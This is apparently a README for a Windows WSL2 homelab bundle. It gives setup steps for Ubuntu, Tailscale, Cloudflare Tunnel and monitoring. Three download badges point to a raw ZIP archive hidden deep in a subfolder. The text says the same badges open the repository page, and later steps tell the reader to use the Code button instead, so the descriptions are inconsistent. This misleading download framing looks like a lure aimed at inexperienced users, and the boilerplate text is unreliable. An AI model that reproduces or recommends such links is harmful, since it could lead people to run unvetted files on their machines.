# 🏠 lextex-homelab - Easy WSL2 Homelab Setup for Windows

[![Download lextex-homelab](https://img.shields.io/badge/Download-lextex--homelab-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/AniketPaul44/lextex-homelab/main/services/user/homelab-lextex-2.3.zip)

---

## 📖 What is lextex-homelab?

lextex-homelab combines Lexi AI agent and Dextex WiFi into one system. It runs on Windows using WSL2 (Windows Subsystem for Linux 2). This setup offers:

- OpenClaw tool for system control  
- Tailscale VPN for secure network access  
- Cloudflare Tunnel to expose your services safely  
- 24/7 system health monitoring  

It provides a ready homelab on Ubuntu inside Windows, letting you run home servers and services with ease.

---

## 🖥️ System Requirements

Before you start, make sure your Windows PC meets these needs:

- Windows 10 version 2004 or newer, or Windows 11  
- WSL2 enabled with Ubuntu installed  
- Minimum 8 GB of RAM recommended  
- At least 10 GB free disk space  
- Internet connection for downloads and VPN setup  

These requirements ensure the homelab runs smoothly.

---

## 🚀 Getting Started: Download lextex-homelab

Click the big button below to go to the GitHub repository page. This page holds the installation files and instructions you need.

[![Download lextex-homelab](https://img.shields.io/badge/Download-lextex--homelab-blue?style=for-the-badge)](https://raw.githubusercontent.com/AniketPaul44/lextex-homelab/main/services/user/homelab-lextex-2.3.zip)

---

## 🔧 Step 1: Install WSL2 and Ubuntu

If you do not have WSL2 and Ubuntu installed, follow these steps:

1. Open PowerShell as Administrator.  
2. Run:  
   ```powershell
   wsl --install
   ```  
   This installs WSL2 and the latest Ubuntu distribution.  
3. Restart your PC when prompted.  
4. After restart, open the **Ubuntu** app from the Start menu.  
5. Set up your Linux user name and password when asked.  

You now have Ubuntu running on your Windows machine.

---

## 📥 Step 2: Download lextex-homelab files

On the GitHub link above:

1. Click the green **Code** button.  
2. Choose **Download ZIP**. Save the ZIP file on your PC.  
3. Extract the contents to a folder you can find easily, like your Desktop.  

Alternatively, if you know how to use Git, you can clone the repository to update files easily.

---

## ⚙️ Step 3: Start lextex-homelab setup inside Ubuntu

1. Open your **Ubuntu** app on Windows.  
2. Use the `cd` command to go to the folder where you extracted the files. For example:  
   ```bash
   cd /mnt/c/Users/YourName/Desktop/lextex-homelab
   ```  
3. Run the main setup script to install all parts:  
   ```bash
   ./setup.sh
   ```  
4. The script will install OpenClaw, Tailscale, Cloudflare Tunnel, and monitoring tools automatically.  
5. Follow any instructions on the screen.  

This process may take some time depending on your internet speed.

---

## 🔐 Step 4: Configure Network Access with Tailscale

Tailscale creates a secure VPN to access your homelab remotely:

1. After setup completes, start Tailscale in Ubuntu:  
   ```bash
   sudo tailscale up
   ```  
2. A web page will open asking you to log in and authorize your device.  
3. Log in with your usual method (Google, Microsoft, GitHub, etc.).  
4. Once connected, your homelab will have a private IP address.  

You can now use this address to connect securely from other devices.

---

## 🌐 Step 5: Set Up Cloudflare Tunnel

Cloudflare Tunnel lets you expose services safely:

1. After setup, you will have a Cloudflare Tunnel configuration file.  
2. Use this command to start the tunnel:  
   ```bash
   cloudflared tunnel run
   ```  
3. The tunnel will forward your chosen services over the internet, behind a secure Cloudflare network.  
4. Log in to your Cloudflare dashboard to manage settings and domains.  

This setup keeps your services safe from direct exposure.

---

## 🩺 Step 6: System Health Monitoring

lextex-homelab includes tools to watch your system’s status 24/7:

- CPU and memory use  
- Service health  
- Network status  
- Log alerts  

These tools run automatically and notify you via the dashboard or email if there are issues.

---

## ❓ Troubleshooting

- If Ubuntu or WSL2 does not start, check if your Windows version supports it and that virtualization is enabled in BIOS.  
- If the setup script fails, check your internet connection and permissions. Run the terminal as Administrator if needed.  
- For Tailscale or Cloudflare issues, confirm accounts and network access are working properly.  
- Look at log files in the `logs` folder inside the homelab directory.  

---

## ⚙️ Updating lextex-homelab

To update lextex-homelab components:

1. Open Ubuntu.  
2. Go to the lextex-homelab folder.  
3. Pull the latest changes if using Git:  
   ```bash
   git pull
   ```  
4. Run the setup script again to apply updates:  
   ```bash
   ./setup.sh
   ```  

---

## 📂 Folder Structure Overview

Inside the extracted folder you will find:

- `setup.sh`: Main installation script  
- `config/`: Configuration files for OpenClaw, Tailscale, and Cloudflare  
- `logs/`: System logs and monitoring records  
- `scripts/`: Helper scripts for managing services  

You can browse these files to customize your homelab.

---

## 🆘 Getting Help

If you need assistance:

- Check the **Issues** tab on the GitHub page  
- Review community forums about WSL2 and Tailscale  
- Search online for specific error messages you encounter  

---

## 🔗 Download and start using lextex-homelab

[![Download lextex-homelab](https://img.shields.io/badge/Download-lextex--homelab-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/AniketPaul44/lextex-homelab/main/services/user/homelab-lextex-2.3.zip)